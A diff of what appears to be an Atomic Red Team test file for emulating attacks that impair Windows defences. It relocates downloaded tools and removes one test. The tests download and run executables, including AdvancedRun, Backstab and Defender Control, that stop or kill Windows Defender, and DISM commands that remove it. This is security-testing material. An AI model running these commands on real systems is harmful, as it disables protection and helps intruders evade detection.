@@ -186,18 +186,19 @@ atomic_tests:
   - description: |
       Sysmon must be downloaded
     prereq_command: |
-      if ((cmd.exe /c "where.exe Sysmon.exe 2> nul | findstr Sysmon 2> nul") -or (Test-Path $env:Temp\Sysmon\Sysmon.exe)) { exit 0 } else { exit 1 }
+      if ((cmd.exe /c "where.exe Sysmon.exe 2> nul | findstr Sysmon 2> nul") -or (Test-Path PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe)) { exit 0 } else { exit 1 }
     get_prereq_command: |
-      Invoke-WebRequest "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "$env:TEMP\Sysmon.zip"
-      Expand-Archive $env:TEMP\Sysmon.zip $env:TEMP\Sysmon -Force
-      Remove-Item $env:TEMP\Sysmon.zip -Force
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\Sysmon.zip"
+      Expand-Archive PathToAtomicsFolder\..\ExternalPayloads\Sysmon.zip PathToAtomicsFolder\..\ExternalPayloads\Sysmon -Force
+      Remove-Item PathToAtomicsFolder\..\ExternalPayloads\Sysmon.zip -Force
   - description: |
       sysmon must be Installed
     prereq_command: |
       if(sc.exe query sysmon | findstr sysmon) { exit 0 } else { exit 1 }
     get_prereq_command: |
       if(cmd.exe /c "where.exe Sysmon.exe 2> nul | findstr Sysmon 2> nul") { C:\Windows\Sysmon.exe -accepteula -i } else
-      { Set-Location $env:TEMP\Sysmon\; .\Sysmon.exe -accepteula -i}
+      { Set-Location PathToAtomicsFolder\..\ExternalPayloads\Sysmon\; .\Sysmon.exe -accepteula -i}
   - description: |
       sysmon filter must be loaded
     prereq_command: |
@@ -550,37 +551,7 @@ atomic_tests:
       Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet
     name: command_prompt
     elevation_required: true
-- name: Disable Defender with Defender Control
-  auto_generated_guid: 178136d8-2778-4d7a-81f3-d517053a4fd6
-  description: |
-    Attempting to use Defender Control software to disable Windows Defender. Upon successful execution, Windows Defender will be turned off. 
-  supported_platforms:
-  - windows
-  input_arguments:
-    DefenderID:
-      description: Defender ID that is used as a sort of passcode to disable it within Defender Control from the command line. The machine-specific Defender ID can be obtained within Defender Control by going to menu, command line info, and then retrieving the 4 character passcode to continue (listed after defendercontrol /d /id in the command line info window).
-      type: string
-      default: FFFF
-    DefenderControlExe:
-      description: Path to Defender Control software version 1.6.
-      type: string
-      default: $env:temp\DefenderControl\DefenderControl\DefenderControl.exe
-  dependency_executor_name: powershell
-  dependencies:
-  - description: |
-      Defender Control must be installed on the machine. 
-    prereq_command: |
-      if (Test-Path #{DefenderControlExe}) {exit 0} else {exit 1}
-    get_prereq_command: |
-      Start-BitsTransfer -Source "https://web.archive.org/web/20201210152711/https://www.sordum.org/files/download/defender-control/DefenderControl.zip" -Destination "$env:temp\defendercontrol.zip" -dynamic
-      expand-archive -LiteralPath "$env:temp\defendercontrol.zip" -DestinationPath "$env:temp\DefenderControl"
-  executor:
-    command: |
-      cmd /c #{DefenderControlExe} /D #{DefenderID} | Out-Null
-    cleanup_command: |
-      cmd /c #{DefenderControlExe} /E | Out-Null
-    name: powershell
-    elevation_required: true
+
 - name: Disable Defender Using NirSoft AdvancedRun
   auto_generated_guid: 81ce22fd-9612-4154-918e-8a1f285d214d
   description: |
@@ -594,7 +565,7 @@ atomic_tests:
     AdvancedRun_Location:
       description: Path of Advanced Run executable
       type: path
-      default: '$env:temp\AdvancedRun.exe'
+      default: 'PathToAtomicsFolder\..\ExternalPayloads\AdvancedRun.exe'
     delete_defender_folder:
       description: Set to 1 to also delete the Windows Defender folder
       type: integer
@@ -606,8 +577,9 @@ atomic_tests:
     prereq_command: |
       if(Test-Path -Path #{AdvancedRun_Location}) {exit 0} else {exit 1}
     get_prereq_command: |
-      Invoke-WebRequest "http://www.nirsoft.net/utils/advancedrun.zip" -OutFile "$env:temp\advancedrun.zip"
-      Expand-Archive -path "$env:temp\advancedrun.zip" -destinationpath "$env:temp\" -Force
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest "http://www.nirsoft.net/utils/advancedrun.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\advancedrun.zip"
+      Expand-Archive -path "PathToAtomicsFolder\..\ExternalPayloads\advancedrun.zip" -destinationpath "PathToAtomicsFolder\..\ExternalPayloads\" -Force
   executor:
     command: |
       Try {cmd /c #{AdvancedRun_Location} /EXEFilename "$env:systemroot\System32\sc.exe" /WindowState 0 /CommandLine "stop WinDefend" /StartDirectory "" /RunAs 8 /Run} Catch{}
@@ -633,11 +605,13 @@ atomic_tests:
       default: MsMpEng.exe
   dependency_executor_name: powershell
   dependencies:
-  - description: Backstab64.exe should exist in %temp%
-    prereq_command: if (Test-Path $env:temp\Backstab64.exe) {exit 0} else {exit 1}
-    get_prereq_command: Start-BitsTransfer -Source "https://github.com/Yaxser/Backstab/releases/download/v1.0.1-beta/Backstab64.exe" -Destination "$env:temp\Backstab64.exe" -dynamic
+  - description: Backstab64.exe should exist in ExtrnalPayloads Directory
+    prereq_command: if (Test-Path PathToAtomicsFolder\..\ExternalPayloads\Backstab64.exe) {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest "https://github.com/Yaxser/Backstab/releases/download/v1.0.1-beta/Backstab64.exe" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\Backstab64.exe"
   executor:
-    command: '& $env:temp\Backstab64.exe -k -n #{process_name}'
+    command: '& PathToAtomicsFolder\..\ExternalPayloads\Backstab64.exe -k -n #{process_name}'
     name: powershell
     elevation_required: true
 - name: WinPwn - Kill the event log services for stealth
